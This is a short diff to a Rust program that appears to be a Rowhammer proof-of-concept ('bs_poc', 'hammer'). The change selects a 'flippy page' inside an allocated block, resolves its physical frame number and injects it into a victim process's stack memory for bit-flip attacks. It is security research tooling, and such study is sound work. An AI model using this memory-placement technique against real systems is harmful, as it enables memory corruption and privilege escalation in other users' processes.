@@ -13,12 +13,13 @@ use bs_poc::{
         mem_configuration::MemConfiguration, BytePointer, ConsecBlocks, GetConsecPfns, MemBlock,
         PageMapInfo, PfnResolver,
     },
-    util::{MB, PAGE_SIZE},
+    util::{KB, MB, PAGE_SIZE},
     victim::{stack_process::InjectionConfig, HammerVictim, StackProcess},
 };
 use clap::{arg, Parser};
+use libc::{mprotect, PROT_READ};
 use log::{debug, info, warn};
-use pagemap::MapsEntry;
+use pagemap::{MapsEntry, PageMap};
 
 /// CLI arguments for the `hammer` binary.
 ///
@@ -89,28 +90,23 @@ fn main() -> anyhow::Result<()> {
                         ConsecBlocks::new(vec![MemBlock::new(x, 4 * MB)])
                     }
                 };
+                let flippy_page = unsafe { x.ptr().byte_add(64 * KB) as *mut libc::c_void };
                 debug!("Collecting PFNs...");
-                let target_pfn = x.pfn()? >> 12;
-                info!("PFNs before victim launch");
-                x.log_pfns();
+                let target_pfn = flippy_page.pfn()? >> 12;
+                //x.log_pfns();
                 debug!("PFNs collected");
+
+                info!("PFN: {:?}", flippy_page.pfn());
                 info!("Launching victim");
                 let mut victim = StackProcess::new(
                     &args.target,
                     InjectionConfig {
-                        flippy_page: x.ptr() as *mut libc::c_void,
-                        /*flippy_page: unsafe {
-                            x.ptr().byte_add(4 * MB - PAGE_SIZE) as *mut libc::c_void
-                        },*/
+                        flippy_page,
                         flippy_page_size: PAGE_SIZE,
                         bait_count_after: bait_after,
                         bait_count_before: bait_before,
                     },
                 )?;
-                if x.len() > PAGE_SIZE {
-                    info!("PFNs after victim launch:");
-                    (unsafe { x.ptr().byte_add(PAGE_SIZE) }, 4 * MB - PAGE_SIZE).log_pfns();
-                }
                 let pid = victim.pid().expect("Failed to get child PID");
                 std::thread::sleep(Duration::from_millis(100));
                 let flippy_region = find_flippy_page(target_pfn, pid)?;
